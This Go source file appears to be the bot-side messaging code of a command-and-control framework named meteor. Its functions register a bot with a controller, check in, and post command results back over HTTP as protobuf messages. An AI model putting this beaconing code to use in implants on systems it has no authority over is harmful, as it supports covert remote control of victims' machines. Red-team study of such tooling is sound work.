package utils

import (
	"bytes"
	"github.com/degenerat3/meteor/meteor/pbuf"
	"github.com/golang/protobuf/proto"
	"io/ioutil"
	"net/http"
)

// HandleCheckin will build the correct proto for a bot checkin
func HandleCheckin(uuid string, core string) []byte {
	url := "http://" + core + "/bot/checkin"
	chk := &mcs.MCS{
		Uuid: uuid,
	}
	chkProto, _ := proto.Marshal(chk)
	resp, err := http.Post(url, "", bytes.NewBuffer(chkProto))
	if err != nil {
		return []byte("")
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return []byte("")
	}
	return data
}

// HandleReg will build the correct proto for a bot registration
func HandleReg(uuid string, interval int32, delta int32, hostname string, core string) []byte {
	url := "http://" + core + "/register/bot"
	chk := &mcs.MCS{
		Uuid:     uuid,
		Interval: interval,
		Delta:    delta,
		Hostname: hostname,
	}
	chkProto, _ := proto.Marshal(chk)
	resp, err := http.Post(url, "", bytes.NewBuffer(chkProto))
	if err != nil {
		return []byte("")
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return []byte("")
	}
	return data
}

// HandleAddRes will build the correct proto for a "addResult"
func HandleAddRes(uuid string, result string, core string) []byte {
	url := "http://" + core + "/add/result"
	chk := &mcs.MCS{
		Uuid:   uuid,
		Result: result,
	}
	chkProto, _ := proto.Marshal(chk)
	resp, err := http.Post(url, "", bytes.NewBuffer(chkProto))
	if err != nil {
		return []byte("")
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return []byte("")
	}
	return data
}
